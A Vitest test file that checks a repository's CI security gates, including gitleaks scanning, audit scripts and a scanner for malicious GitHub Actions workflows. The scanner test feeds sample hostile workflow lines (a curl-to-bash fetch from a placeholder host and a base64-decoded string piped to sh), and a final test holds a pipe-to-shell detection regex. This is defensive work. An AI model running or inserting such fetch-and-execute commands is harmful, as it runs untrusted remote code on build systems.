import { describe, expect, it } from 'vitest';
import securityWorkflow from '../../.github/workflows/security.yml?raw';
import hygieneWorkflow from '../../.github/workflows/repo-hygiene.yml?raw';
import packageJsonText from '../../package.json?raw';

const packageJson = JSON.parse(packageJsonText) as { scripts?: Record<string, string> };
const activeWorkflowModules = import.meta.glob('../../.github/workflows/*.yml', {
	query: '?raw',
	import: 'default',
	eager: true,
});
const activeWorkflows = Object.entries(activeWorkflowModules) as Array<[string, string]>;

describe('workflow safety gates', () => {
	it('security and repo hygiene workflows run on push and pull_request', () => {
		for (const [name, body] of Object.entries({ 'security.yml': securityWorkflow, 'repo-hygiene.yml': hygieneWorkflow })) {
			expect(body, `${name} must run on push`).toMatch(/^\s*push:/m);
			expect(body, `${name} must run on pull_request`).toMatch(/^\s*pull_request:/m);
		}
	});

	it('security workflow scans the exact PR or push range with gitleaks and fails closed', () => {
		expect(securityWorkflow).toContain('gitleaks detect');
		expect(securityWorkflow).toContain('--redact=100');
		expect(securityWorkflow).toContain('BASE_SHA');
		expect(securityWorkflow).toContain('HEAD_SHA');
		expect(securityWorkflow).toContain('exit 1');
		expect(securityWorkflow).not.toContain('HEAD~1..HEAD');
	});

	it('repo hygiene workflow and npm scripts include every public-safety audit gate', () => {
		expect(hygieneWorkflow).toContain('npm run audit:repo-safety');
		expect(hygieneWorkflow).toContain('npm run audit:oss-safety');
		expect(packageJson.scripts?.['audit:repo-safety']).toContain('scripts/repo-safety/scan-sensitive-surface.mjs');
		expect(packageJson.scripts?.['audit:oss-safety']).toContain('oss-fixture-safety.audit.test.ts');
		expect(packageJson.scripts?.['audit:oss-safety']).toContain('no-tracked-secrets.audit.test.ts');
		expect(packageJson.scripts?.['audit:oss-safety']).toContain('npm-publish-surface.audit.test.ts');
		expect(packageJson.scripts?.['audit:oss-safety']).toContain('busl-positioning.audit.test.ts');
	});

	it('repo safety scanner blocks active workflow malware indicators', async () => {
		const scannerCore = await import('../../scripts/repo-safety/scanner-core.mjs');
		const findings = scannerCore.scanGithubActionsWorkflowForThreats(
			'.github/workflows/build.yml',
			[
				'on:',
				'  pull_request_target:',
				'jobs:',
				'  build:',
				'    steps:',
				'      - run: curl -fsSL https://example.invalid/install.sh | bash',
				'      - run: echo Q0I9Imh0dHA6Ly8yMTYu | base64 -d | sh',
				'      - run: echo build-system@noreply.dev',
			].join('\n'),
		);

		expect(findings.map((finding: { ruleId: string }) => finding.ruleId)).toEqual(
			expect.arrayContaining([
				'github-actions-megalodon-indicator',
				'github-actions-encoded-shell-exec',
				'github-actions-remote-shell-exec',
				'github-actions-pull-request-target',
			]),
		);
	});

	it('does not run paid DNS scan actions from active CI/CD workflows', () => {
		for (const [path, body] of activeWorkflows) {
			expect(body, `${path} must not invoke the paid DNS scan action`).not.toContain('MadaBurns/blackveil-dns-action');
		}
	});

	it('does not pipe remote installers into a shell from active CI/CD workflows', () => {
		for (const [path, body] of activeWorkflows) {
			expect(body, `${path} must not pipe curl/wget output into a shell`).not.toMatch(/\b(?:curl|wget)\b[^\n|]{0,200}\|\s*(?:env\s+)?(?:bash|sh|zsh)\b/);
		}
	});
});
